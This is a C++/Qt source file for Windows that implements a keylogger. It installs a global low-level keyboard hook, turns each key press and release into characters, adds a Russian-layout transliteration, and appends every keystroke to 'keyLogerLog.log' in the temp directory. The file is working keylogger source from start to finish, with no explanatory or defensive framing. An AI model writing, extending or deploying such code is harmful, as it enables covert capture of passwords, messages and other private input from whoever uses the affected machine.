#include "application.h"
#include <QProcess>
#include <QDir>
#include <QTextStream>

void updateKeyState(BYTE* b, int value) {
    b[value] = GetKeyState(value);
}

char rus(char v) {
    static const char en[] = "qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:\"ZXCVBNM<>?";
    static const char ru[] = "йцукенгшщзхъфывапролджэячсмитьбю.ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ.";
    int i(0);
    while (en[i] && en[i] != v) {
        ++i;
    }
    if (en[i]) {
        return ru[i];
    }
    return v;
}

LRESULT CALLBACK patrol(int nCode, WPARAM wParam, LPARAM lParam) {
    if (wParam != WM_KEYDOWN && wParam != WM_KEYUP) {
        return CallNextHookEx(static_cast<Application*>(qApp)->hHook, nCode, wParam, lParam);
    }

    //get the key information
    KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT*)lParam);

    wchar_t buffer[5];

    //get the keyboard state
    BYTE state[0x100];
    GetKeyboardState(state);
    updateKeyState(state, VK_SHIFT);
    updateKeyState(state, VK_CAPITAL);
    updateKeyState(state, VK_CONTROL);
    updateKeyState(state, VK_MENU);

    //get keyboard layout
    HKL layout = GetKeyboardLayout(0);

    //get the name
    char lpszName[0x99];

    DWORD dwMsg = 1;
    dwMsg += cKey.scanCode << 0x10;
    dwMsg += cKey.flags << 0x18;

    int i = GetKeyNameText(dwMsg, (LPTSTR)lpszName,  0x99);

    //try to convert the key info
    int result(ToUnicodeEx(cKey.vkCode, cKey.scanCode, state, buffer, 4,0, layout));
    buffer[4] = L'\0';

    enum StateKeys {
        Shift = 160,
        Left = 37,
        Right = 39,
        Bottom = 40,
        Top = 38,
        Ctrl = 162,
        Backspace = 8
    };

    QString key(QString::fromUtf16((ushort*)buffer));
    switch (cKey.vkCode) {
    case Shift:
        key = "Shift";
        break;
    case Left:
        key = "Left";
        break;
    case Right:
        key = "Right";
        break;
    case Bottom:
        key = "Bottom";
        break;
    case Top:
        key = "Top";
        break;
    case Ctrl:
        key = "Ctrl";
        break;
    case Backspace:
        key = "Backspace";
        break;
    }
    if (wParam == WM_KEYUP) {
        switch(cKey.vkCode) {
        case Shift:
            static_cast<Application*>(qApp)->shift = false;
        case Left:
        case Right:
        case Bottom:
        case Top:
        case Ctrl:
        case Backspace:
            key += " up";
            break;
        default:
            return CallNextHookEx(static_cast<Application*>(qApp)->hHook, nCode, wParam, lParam);
        }
    } else if (cKey.vkCode == Shift) {
        static_cast<Application*>(qApp)->shift = true;
    }

    static int j(0);
    ++i;
    QFile f(static_cast<Application*>(qApp)->fName);
    f.open(QFile::Append);
    char ru(rus(cKey.vkCode));
    QTextStream(&f) << cKey.vkCode << '\t' << (char)cKey.vkCode << '\t' <<
                       (char)(static_cast<Application*>(qApp)->shift ? toupper(cKey.vkCode) : tolower(cKey.vkCode))
                    << '\t' << key << '\t' <<
                    (char)(static_cast<Application*>(qApp)->shift ? toupper(ru) : tolower(ru))
                    << '\t' <<
                       //((++j % 100) ? QString("") : QTime::currentTime().toString() + " " + QDate::currentDate().toString()) <<
                       '\n';
    f.close();

    return CallNextHookEx(static_cast<Application*>(qApp)->hHook, nCode, wParam, lParam);
}

Application::Application(int argc, char ** argv)
    : QApplication(argc, argv)
    , fName(QDir::tempPath() + "/keyLogerLog.log")
{
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, patrol, NULL, 0);
    shift = false;
}

Application::~Application()
{

}
